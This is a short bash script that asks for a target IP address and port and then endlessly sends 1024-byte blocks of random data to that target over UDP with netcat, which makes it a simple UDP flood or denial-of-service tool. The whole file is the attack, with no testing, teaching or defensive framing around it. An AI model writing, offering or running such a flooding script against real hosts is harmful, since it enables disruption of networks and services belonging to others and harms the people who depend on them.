#!/bin/bash

# Get user input
echo "Enter target IP:"
read target_ip

echo "Enter target port:"
read target_port

# Start sending random UDP packets
while true
do
  head -c 1024 /dev/urandom | nc -u $target_ip $target_port
  echo "Packet sent to $target_ip:$target_port"
done
